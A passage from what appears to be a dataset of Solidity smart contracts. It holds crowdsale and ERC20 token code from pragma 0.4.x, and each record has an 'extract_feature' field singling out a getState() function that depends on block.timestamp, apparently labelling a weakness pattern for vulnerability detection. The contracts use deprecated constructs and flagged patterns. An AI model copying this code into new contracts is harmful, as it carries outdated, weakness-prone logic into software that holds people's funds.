updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract UpgradeAgent {\n uint public originalSupply;\n function isUpgradeAgent() public constant returns (bool) {\n return true;\n }\n function upgradeFrom(address _from, uint256 _value) public;\n}\ncontract UpgradeableToken is StandardToken {\n address public upgradeMaster;\n UpgradeAgent public upgradeAgent;\n uint256 public totalUpgraded;\n enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\n event Upgrade(address indexed _from, address indexed _to, uint256 _value);\n event UpgradeAgentSet(address agent);\n function UpgradeableToken(address _upgradeMaster) {\n upgradeMaster = _upgradeMaster;\n }\n function upgrade(uint256 value) public {\n UpgradeState state = getUpgradeState();\n if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\n throw;\n }\n if (value == 0) throw;\n balances[msg.sender] = safeSub(balances[msg.sender], value);\n totalSupply = safeSub(totalSupply, value);\n totalUpgraded = safeAdd(totalUpgraded, value);\n upgradeAgent.upgradeFrom(msg.sender, value);\n Upgrade(msg.sender, upgradeAgent, value);\n }\n function setUpgradeAgent(address agent) external {\n if(!canUpgrade()) {\n throw;\n }\n if (agent == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n if (getUpgradeState() == UpgradeState.Upgrading) throw;\n upgradeAgent = UpgradeAgent(agent);\n if(!upgradeAgent.isUpgradeAgent()) throw;\n if (upgradeAgent.originalSupply() != totalSupply) throw;\n UpgradeAgentSet(upgradeAgent);\n }\n function getUpgradeState() public constant returns(UpgradeState) {\n if(!canUpgrade()) return UpgradeState.NotAllowed;\n else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\n else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\n else return UpgradeState.Upgrading;\n }\n function setUpgradeMaster(address master) public {\n if (master == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n upgradeMaster = master;\n }\n function canUpgrade() public constant returns(bool) {\n return true;\n }\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract CrowdsaleTokenExt is ReleasableToken, MintableTokenExt, UpgradeableToken {\n event UpdatedTokenInformation(string newName, string newSymbol);\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n string public name;\n string public symbol;\n uint public decimals;\n uint public minCap;\n function CrowdsaleTokenExt(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable, uint _globalMinCap)\n UpgradeableToken(msg.sender) {\n owner = msg.sender;\n name = _name;\n symbol = _symbol;\n totalSupply = _initialSupply;\n decimals = _decimals;\n minCap = _globalMinCap;\n balances[owner] = totalSupply;\n if(totalSupply > 0) {\n Minted(owner, totalSupply);\n }\n if(!_mintable) {\n mintingFinished = true;\n if(totalSupply == 0) {\n throw;\n }\n }\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n mintingFinished = true;\n super.releaseTokenTransfer();\n }\n function canUpgrade() public constant returns(bool) {\n return released && super.canUpgrade();\n }\n function setTokenInformation(string _name, string _symbol) onlyOwner {\n name = _name;\n symbol = _symbol;\n UpdatedTokenInformation(name, symbol);\n }\n function claimTokens(address _token) public onlyOwner {\n require(_token != address(0));\n ERC20 token = ERC20(_token);\n uint balance = token.balanceOf(this);\n token.transfer(owner, balance);\n ClaimedTokens(_token, owner, balance);\n }\n}\ncontract ReservedTokensFinalizeAgent is FinalizeAgent {\n using SafeMathLibExt for uint;\n CrowdsaleTokenExt public token;\n CrowdsaleExt public crowdsale;\n uint public distributedReservedTokensDestinationsLen = 0;\n function ReservedTokensFinalizeAgent(CrowdsaleTokenExt _token, CrowdsaleExt _crowdsale) public {\n token = _token;\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return (token.releaseAgent() == address(this));\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n assert(msg.sender == address(crowdsale));\n assert(reservedTokensDistributionBatch > 0);\n assert(!reservedTokensAreDistributed);\n assert(distributedReservedTokensDestinationsLen < token.reservedTokensDestinationsLen());\n uint tokensSold = 0;\n for (uint8 i = 0; i < crowdsale.joinedCrowdsalesLen(); i++) {\n CrowdsaleExt tier = CrowdsaleExt(crowdsale.joinedCrowdsales(i));\n tokensSold = tokensSold.plus(tier.tokensSold());\n }\n uint startLooping = distributedReservedTokensDestinationsLen;\n uint batch = token.reservedTokensDestinationsLen().minus(distributedReservedTokensDestinationsLen);\n if (batch >= reservedTokensDistributionBatch) {\n batch = reservedTokensDistributionBatch;\n }\n uint endLooping = startLooping + batch;\n for (uint j = startLooping; j < endLooping; j++) {\n address reservedAddr = token.reservedTokensDestinations(j);\n if (!token.areTokensDistributedForAddress(reservedAddr)) {\n uint allocatedBonusInPercentage;\n uint allocatedBonusInTokens = token.getReservedTokens(reservedAddr);\n uint percentsOfTokensUnit = token.getReservedPercentageUnit(reservedAddr);\n uint percentsOfTokensDecimals = token.getReservedPercentageDecimals(reservedAddr);\n if (percentsOfTokensUnit > 0) {\n allocatedBonusInPercentage = tokensSold * percentsOfTokensUnit / 10**percentsOfTokensDecimals / 100;\n token.mint(reservedAddr, allocatedBonusInPercentage);\n }\n if (allocatedBonusInTokens > 0) {\n token.mint(reservedAddr, allocatedBonusInTokens);\n }\n token.finalizeReservedAddress(reservedAddr);\n distributedReservedTokensDestinationsLen++;\n }\n }\n if (distributedReservedTokensDestinationsLen == token.reservedTokensDestinationsLen()) {\n reservedTokensAreDistributed = true;\n }\n }\n function finalizeCrowdsale() public {\n assert(msg.sender == address(crowdsale));\n if (token.reservedTokensDestinationsLen() > 0) {\n assert(reservedTokensAreDistributed);\n }\n token.releaseTokenTransfer();\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f97"
  },
  "filename": "9803.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract NullFinalizeAgentExt is FinalizeAgent {\n CrowdsaleExt public crowdsale;\n function NullFinalizeAgentExt(CrowdsaleExt _crowdsale) {\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return true;\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n }\n function finalizeCrowdsale() public {\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f98"
  },
  "filename": "9805.sol",
  "content": "pragma solidity ^0.4.8;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function 